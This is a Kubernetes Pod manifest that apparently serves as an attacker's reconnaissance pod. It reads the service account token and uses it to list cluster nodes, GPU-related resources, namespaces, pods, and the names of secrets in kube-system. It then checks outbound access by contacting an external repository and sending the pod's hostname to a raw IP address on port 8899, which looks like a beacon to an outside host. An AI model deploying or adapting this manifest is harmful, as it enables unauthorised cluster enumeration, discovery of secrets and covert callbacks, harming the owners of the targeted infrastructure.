apiVersion: v1
kind: Pod
metadata:
  name: scout
  namespace: t19gpu
spec:
  restartPolicy: Never
  serviceAccountName: t19admin
  containers:
  - name: s
    image: alpine:3.19
    command: ["/bin/sh","-c"]
    args:
    - |
      T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
      API=https://kubernetes.default.svc
      echo "== NODES"
      curl -s --cacert $CA -H "Authorization: Bearer $T" "$API/api/v1/nodes" -o /tmp/n.json
      grep -o '"name":"[^"]*"' /tmp/n.json | head -20
      echo "== GPU-ISH"
      grep -o -i -E '"(nvidia[^"]*|gpu[^"]*)"' /tmp/n.json | sort -u | head -30
      echo "== NODE LABELS/TAINTS"
      grep -o '"kubernetes.io/hostname":"[^"]*"' /tmp/n.json | head
      echo "== NS"
      curl -s --cacert $CA -H "Authorization: Bearer $T" "$API/api/v1/namespaces" | grep -o '"name":"[^"]*"' | head -40
      echo "== PODS-A"
      curl -s --cacert $CA -H "Authorization: Bearer $T" "$API/api/v1/pods" | grep -o -i -E '"name":"[^"]*(gpu|nvidia|virt|dcgm)[^"]*"' | sort -u | head -30
      echo "== SECRETS-KS"
      curl -s --cacert $CA -H "Authorization: Bearer $T" "$API/api/v1/namespaces/kube-system/secrets" | grep -o '"name":"[^"]*"' | head -30
      echo "== NET"
      echo "EGRESS1:"; (wget -T 6 -qO- https://repo.neo.id/neo-gpu/version.json 2>&1 | head -c 120) || echo fail1
      echo; echo "EGRESS2:"; (wget -T 6 -qO- http://103.77.104.208:8899/sc?h=$(hostname) 2>&1 | head -c 80) || echo fail2
      ip route 2>/dev/null | head -5
      echo DONE
      sleep 900
